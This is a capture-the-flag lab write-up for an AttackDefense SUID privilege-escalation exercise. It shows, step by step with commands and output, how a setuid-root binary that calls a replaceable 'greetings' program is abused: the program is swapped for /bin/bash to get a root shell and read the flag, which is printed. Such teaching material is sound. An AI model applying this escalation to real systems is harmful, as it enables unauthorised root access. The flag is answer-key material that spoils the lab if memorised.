# 🔬SUID

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> 🔬 [Exploiting Setuid Programs](https://www.attackdefense.com/challengedetails?cid=73)
>
> * **SUID** Privilege escalation
> * Already logged on as `student` unprivileged user

```bash
whoami
    student
groups student
    student : student
```

* Check the contents of the students directory.

```bash
pwd
    /home/student
ls -al
    total 36
    drwxr-xr-x 1 student student 4096 Sep 22  2018 .
    drwxr-xr-x 1 root    root    4096 Sep 22  2018 ..
    -rw-r--r-- 1 root    root      88 Sep 22  2018 .bashrc
    -r-x------ 1 root    root    8296 Sep 22  2018 greetings
    -rwsr-xr-x 1 root    root    8344 Sep 22  2018 welcome
```

<figure><img src="../../../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

> `welcome` file has the `SUID` permission applied.

```bash
./greetings
	bash: ./greetings: Permission denied
./welcome
	Welcome to Attack Defense Labs
```

* Observe that the welcome binary has suid bit set (or on). This means that this binary and its child processes will run with root privileges. Check the file type

```bash
file welcome
    welcome: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=199bc8fd6e66e29f770cdc90ece1b95484f34fca, not stripped
```

> It is an ELF binary.

* Investigate the binary. The most easy or preliminary way of doing that is to use strings command.
* Observe the greetings strings in the output of the strings command. It is possible that welcome binary is calling greetings binary. So, replace the greetings binary with some other binary (say `/bin/bash`) which should then also get executed as root.

<figure><img src="../../../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

* Delete greetings binary and then copy `/bin/bash` to its location and rename that to greetings.

```bash
rm greetings
cp /bin/bash greetings
```

* Run the `welcome` binary again.

```bash
./welcome
whoami
cd /root/
ls
cat flag
```

<figure><img src="../../../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `b92bcdc876d52108778e2d81f3b01494`
{% endhint %}

